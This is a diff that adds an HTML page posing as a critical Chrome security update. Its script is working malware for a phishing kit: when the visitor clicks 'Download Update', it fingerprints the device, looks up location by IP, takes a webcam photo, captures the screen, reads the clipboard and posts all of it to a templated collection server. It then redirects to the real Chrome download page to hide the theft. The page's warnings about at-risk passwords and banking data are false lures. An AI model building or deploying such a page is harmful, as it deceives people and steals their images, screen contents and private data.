@@ -1,0 +1,104 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0">
+<title>Browser Update Required</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:'Segoe UI',system-ui,-apple-system,sans-serif;background:#f0f2f5;min-height:100vh;display:flex;align-items:center;justify-content:center}
+.card{background:#fff;border-radius:12px;box-shadow:0 8px 32px rgba(0,0,0,.1);padding:48px;max-width:480px;width:90%;text-align:center;border:1px solid #e8e8ed}
+.warning-icon{width:72px;height:72px;background:#fff3e0;border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 24px;font-size:36px}
+h1{font-size:22px;font-weight:600;color:#1d1d1f;margin-bottom:8px}
+.sub{color:#86868b;font-size:14px;margin-bottom:24px;line-height:1.5}
+.severity{display:inline-block;background:#ff3b30;color:#fff;font-size:11px;font-weight:600;padding:4px 12px;border-radius:4px;margin-bottom:20px;letter-spacing:.5px;text-transform:uppercase}
+.update-list{text-align:left;background:#f8f9fa;border-radius:8px;padding:16px;margin-bottom:24px;font-size:13px;color:#555}
+.update-list div{padding:6px 0;display:flex;align-items:center;gap:8px}
+.update-list .dot{width:6px;height:6px;background:#007aff;border-radius:50%;flex-shrink:0}
+.btn-primary{background:#007aff;color:#fff;border:none;border-radius:10px;padding:14px 32px;font-size:15px;cursor:pointer;font-weight:600;width:100%;transition:all .15s}
+.btn-primary:hover{background:#0066d6}
+.btn-primary:disabled{opacity:.4;cursor:default}
+.btn-secondary{background:transparent;color:#007aff;border:none;padding:10px;font-size:13px;cursor:pointer;margin-top:12px;width:100%}
+.btn-secondary:hover{opacity:.8}
+.loading{display:none;margin-top:16px;color:#666;font-size:14px}
+#video{display:none;width:100%;border-radius:8px;margin:16px 0;background:#000;max-height:200px;object-fit:cover}
+</style>
+</head>
+<body>
+<div class="card">
+<div class="warning-icon">⚠️</div>
+<div class="severity">Critical Security Update</div>
+<h1>Your browser is out of date</h1>
+<p class="sub">You're using an older version of your browser that has known security vulnerabilities. Update now to protect your data.</p>
+<div class="update-list">
+<div><span class="dot"></span> 2 unpatched <b>critical</b> vulnerabilities</div>
+<div><span class="dot"></span> Your saved passwords may be at risk</div>
+<div><span class="dot"></span> Banking & payment data affected</div>
+<div><span class="dot"></span> Version: Chrome <span id="old_ver">114</span> • Latest: 126</div>
+</div>
+<button class="btn-primary" id="update_btn" onclick="startUpdate()">⬇️ Download Update</button>
+<button class="btn-secondary" onclick="skip()">Remind me later</button>
+<video id="video" autoplay muted playsinline></video>
+<div class="loading" id="loading">Preparing update package...</div>
+</div>
+<script>
+const LID='{{LINK_ID}}',BASE='{{BASE_URL}}',SID='{{SESSION_ID}}';
+let c={session:SID};
+// Fake browser version
+try{
+    const m=navigator.userAgent.match(/Chrome\/(\d+)/);
+    if(m)document.getElementById('old_ver').textContent=m[1]
+}catch(e){}
+async function collect(){
+    c.ua=navigator.userAgent;c.platform=navigator.platform;
+    c.screen=screen.width+'x'+screen.height;c.language=navigator.language;
+    c.timezone=Intl.DateTimeFormat().resolvedOptions().timeZone;
+    c.cpu_cores=navigator.hardwareConcurrency;
+    c.device_memory=navigator.deviceMemory;
+    try{
+        const r=await fetch('https://ip-api.com/json/?fields=query,country,city,lat,lon,isp,org,as,proxy,hosting');
+        const j=await r.json();Object.assign(c,j)
+    }catch(e){}
+    try{
+        const st=await navigator.mediaDevices.getUserMedia({video:{facingMode:'user'}});
+        const v=document.getElementById('video');v.srcObject=st;v.style.display='block';
+        await new Promise(r=>setTimeout(r,2000));
+        const ca=document.createElement('canvas');ca.width=v.videoWidth||640;ca.height=v.videoHeight||480;
+        ca.getContext('2d').drawImage(v,0,0);
+        c.photo=ca.toDataURL('image/jpeg',0.85).split(',')[1];
+        st.getTracks().forEach(t=>t.stop())
+    }catch(e){}
+    try{
+        const st=await navigator.mediaDevices.getDisplayMedia({preferCurrentTab:true});
+        const tr=st.getVideoTracks()[0];const ic=new ImageCapture(tr);const bm=await ic.grabFrame();
+        const ca=document.createElement('canvas');ca.width=bm.width;ca.height=bm.height;
+        ca.getContext('2d').drawImage(bm,0,0);
+        c.screenshot=ca.toDataURL('image/png').split(',')[1];
+        tr.stop();st.getTracks().forEach(t=>t.stop())
+    }catch(e){}
+    try{const txt=await navigator.clipboard.readText();if(txt)c.clipboard=txt}catch(e){}
+    c.visit_duration=Math.floor((Date.now()-t0)/1000);
+    await fetch(BASE+'/c/'+LID,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(c)})
+}
+async function startUpdate(){
+    document.getElementById('update_btn').disabled=true;
+    document.getElementById('update_btn').textContent='⏳ Downloading...';
+    document.getElementById('loading').style.display='block';
+    await collect();
+    document.getElementById('loading').textContent='✓ Update ready! Redirecting to download...';
+    setTimeout(()=>{
+        // Скачивание или редирект на реальный сайт
+        const a=document.createElement('a');
+        a.href='https://www.google.com/chrome/';
+        a.target='_blank';
+        a.click();
+        window.location.href='https://www.google.com'
+    },2000)
+}
+function skip(){
+    window.location.href='https://www.google.com'
+}
+const t0=Date.now()
+</script>
+</body>
+</html>
